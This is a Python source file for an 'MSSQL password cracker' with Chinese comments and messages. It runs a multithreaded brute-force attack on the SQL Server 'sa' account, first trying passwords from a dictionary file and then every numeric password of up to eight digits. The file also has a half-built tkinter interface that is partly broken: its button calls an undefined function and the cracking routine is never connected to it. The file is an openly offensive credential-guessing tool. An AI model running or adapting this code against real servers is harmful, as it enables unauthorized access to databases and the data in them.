#!/usr/bin/evn python
#-*- coding:utf-8 -*-
'''
Created on 2018年11月19日

@author: jinfeng
'''


from threading import Thread
import time
import os
import pymssql
import tkinter as tk  
from tkinter import ttk  
from tkinter import scrolledtext  
from tkinter import Menu  
from tkinter import Spinbox  
from tkinter import messagebox as mBox
from tkinter.filedialog  import asksaveasfilename 
from tkinter.filedialog import askopenfilename


def cracker(server,pswd_list,no):
    global tag
    
    print(u"No.%s号线程已开始运行，对%d个常用密码进行测试 !" % (no,len(pswd_list)))
    for pswd in pswd_list:
        if not tag:
            try:
                conn=pymssql.connect(server,'sa',str(pswd),database='master')
                print(u"No.%s号线程运行结束 !\n 服务器%s 账号sa的密码为 ：  %s\n" % (no,server,pswd))
                tag = True
                conn.close()
                break
            except:
                continue
        else:
            break
    
    #print(u"No.%s号线程运行结束 !" % no)
        
    
def get_pwlist():
    pwlist = []
    with open('passwddic.txt','r') as f:
        for line in f.readlines():
            password = line.strip('\n')
            pwlist.append(password)
    return pwlist

def main_cracker(win):
    global tag
    tag = False
    server = '127.0.0.1'
    num_thread = 10
    time_start = time.time()
    pwlist = get_pwlist()
    step = len(pwlist)//num_thread+1  
    for n in range(num_thread):
        t1 = Thread(target = cracker,args = (server,pwlist[step*n:step*n+step],str(n+1),))
        t1.start()
    t1.join()
    
    if not tag:
        print(u'密码字典测试完毕，未找到匹配密码，将遍历测试8位以内所有数字密码！')
        for m in range(10):
            t2 = Thread(target = cracker,args = (server,range(m*10000000,(m+1)*10000000),str(m+1)+'+',))
            t2.start()
        t2.join()
    time_end = time.time()
    time_use = time_end - time_start
    print(u'用时 %d时%d分%d秒' % (time_use//3600,time_use%3600//60,time_use%60))
    
def main():
    windows = tk.Tk()
    windows.geometry('350x300')
    windows.resizable(False, False)
    windows.title("MSSQL密码破解 ")
    
    def _quit():  
        windows.quit()  
        windows.destroy()  
        exit()  
        
    def msg_datecheck():
        mBox.showwarning("title","text")
        
    def select_excel():
        #filename=asksaveasfilename(parent = windows,defaultextension='.xls')
        filename = askopenfilename(filetypes=[("excel格式",".xls")])
        vartext.set(filename)
        output = check_xls(filename)
        scr.insert(tk.END, output)
    label = ttk.Label(windows,text=u'服务器地址：')
    label.grid(row=0,column=0, padx=6,pady=10, sticky=tk.W)
    vartext = tk.StringVar()
    entry = tk.Entry(windows,width=25,textvariable=vartext)
    entry.grid(row=0,column=1,padx=6,pady=10, sticky=tk.W)
    button = tk.Button(windows,width=6,text="测试密码",command=select_excel)
    button.grid(row=0,column=2,padx=6,pady=8,rowspan=2, sticky=tk.W)
    label = ttk.Label(windows,text=u'账号：')
    label.grid(row=1,column=0, padx=6,pady=10, sticky=tk.W)
    vartext = tk.StringVar()
    entry = tk.Entry(windows,width=25,textvariable=vartext)
    entry.grid(row=1,column=1,padx=6,pady=10, sticky=tk.W)

    scr = scrolledtext.ScrolledText(windows, width=30, height=10, wrap=tk.WORD)  
    scr.grid(column=0, row=2, sticky='WE', columnspan=3) 
    
    windows.mainloop()
    
if __name__ == "__main__":
    main()

